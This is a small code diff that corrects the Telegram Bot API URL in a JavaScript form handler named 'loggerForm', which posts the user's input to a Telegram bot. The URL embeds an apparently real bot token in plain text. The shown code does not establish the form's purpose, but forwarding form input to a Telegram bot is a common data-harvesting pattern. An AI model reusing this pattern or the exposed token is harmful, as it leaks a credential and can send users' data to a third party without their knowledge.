@@ -4,7 +4,7 @@ document.getElementById("loggerForm").addEventListener("submit", function(event)
     var data = document.getElementById("data").value; // Get the data from the input field
   
     // Send the data to the Telegram bot using the fetch API
-    fetch("https://api.telegram.org/7089001257:AAFWtmFWIaSXXY4Q1japuPnTvSchx_e7NB8/sendMessage", {
+    fetch("https://api.telegram.org/bot7089001257:AAFWtmFWIaSXXY4Q1japuPnTvSchx_e7NB8/sendMessage", {
       method: "POST",
       headers: {
         "Content-Type": "application/json"
